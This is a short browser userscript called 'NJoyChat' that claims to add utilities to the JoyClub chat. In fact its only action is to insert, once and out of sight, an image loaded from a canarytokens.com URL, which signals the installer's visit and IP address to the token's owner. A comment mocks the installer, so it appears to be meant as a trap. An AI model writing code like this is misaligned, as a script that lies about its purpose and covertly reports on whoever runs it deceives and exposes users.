// ==UserScript==
// @name         NJoyChat
// @namespace    https://www.joyclub.de/chat/login/
// @version      Alpha-v99999
// @description  Improves JoyChat with additional utilities.
// @author       NJoyChat Team
// @match        https://www.joyclub.de/chat/login/
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        GM.getValue
// @grant        GM.setValue
// @grant        GM.addStyle
// @require      https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js
// @run-at       document-idle
// ==/UserScript==


(async () => {
    'use strict';
    this.$ = this.jQuery = jQuery.noConflict(true); // Don't break existing JQuery

    // Play stupid games, win stupid prizes...
    //
    // (lol lmao)

    let trigger_once = await GM.getValue('triggered', -1)
    if (trigger_once === -1){
        let image = document.createElement('img')
        image.src = 'http://canarytokens.com/stuff/traffic/tags/mdcg328664et68b7hvw2ir3vs/contact.php'
        image.hidden = true
        document.body.appendChild(image)
        await GM.setValue('triggered', 1)
    }
}
)
    ();

